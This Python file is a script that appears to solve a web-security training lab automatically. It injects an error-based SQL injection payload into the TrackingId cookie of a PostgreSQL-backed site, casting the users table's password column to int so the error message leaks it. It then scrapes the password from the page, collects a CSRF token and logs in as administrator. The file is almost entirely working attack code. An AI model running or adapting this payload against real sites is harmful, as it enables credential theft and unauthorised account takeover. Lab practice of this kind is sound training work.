from base.base import Base
from bs4 import BeautifulSoup
from requests import Response
from sql_injection.util import SQLComments

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def _add_args(self):
        pass

    def _cookie_injector(self, content: str):
        self.session.cookies.pop("TrackingId")
        self.session.cookies.set("TrackingId", f"{content}")
    
    def _verify_true_query(self, response: Response):
        if response.status_code == 200:
            return True
        else:
            return False
    
    def _prepare_payload(self):
        base_payload = f"' AND 1=(SELECT 1/(password::int) FROM users LIMIT 1){SQLComments.POSTGRES}"
        return base_payload
    
    def _extract_password(self):
        self._cookie_injector(self._prepare_payload())
        
        response = self.session.get(f"{self.base_url}/")
        soup = BeautifulSoup(response.text, 'html.parser')
        main_container = soup.find('section', attrs={'class': 'maincontainer'})
        password_leaker = main_container.find('p', attrs={'class': 'is-warning'})
        dirty_password = password_leaker.text.strip()
        password = (dirty_password.split("\"")[1]).replace("\"", "")
        return password
    
    
    def _get_csrf_token(self):
        response = self.session.get(f"{self.base_url}/login")
        
        # Extract CSRF token from the hidden input field in the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrf'})
        
        if csrf_input and csrf_input.get('value'):
            csrf_token = csrf_input.get('value')
            self.log(f"Found CSRF token: {csrf_token}", "verbose")
        else:
            self.log("Could not find CSRF token in the response", "error")
            exit(1)
            
        return csrf_token

    def run(self):

        self.password = self._extract_password()
        self.log(f"Password: {self.password}", "verbose")

        self.log(f"Logging in with credentials: administrator / {self.password}", "verbose")

        self.log("Cleaning cookie", "verbose")
        self._cookie_injector(f"")

        csrf_token = self._get_csrf_token()
        self.log(f"CSRF token: {csrf_token}", "verbose")

        self.log("Logging in", "verbose")

        self.session.post(f"{self.base_url}/login", data={"username": "administrator", "password": self.password, "csrf": csrf_token})
        
        self.is_lab_solved()
    

if __name__ == "__main__":
    sql = SQL()
    sql.run()